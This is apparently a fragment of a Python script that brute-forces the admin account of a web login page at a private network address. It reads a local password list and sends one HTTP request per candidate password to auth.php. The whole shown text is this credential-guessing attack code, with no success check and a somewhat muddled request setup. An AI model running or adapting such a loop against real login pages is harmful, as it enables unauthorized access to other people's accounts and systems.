...
url = 'http://192.168.1.81/auth.php?login=admin&pass='
exploit = open('C:\\Users\\MARCH\\Desktop\\passlist.txt', 'r', encoding="ISO-8859-1").readlines()

for line in exploit:
    password = line.strip()
    http =  requests.get(url, data={'login':'admin','pass' :password, 'submit':'submit' })
    content = http.content
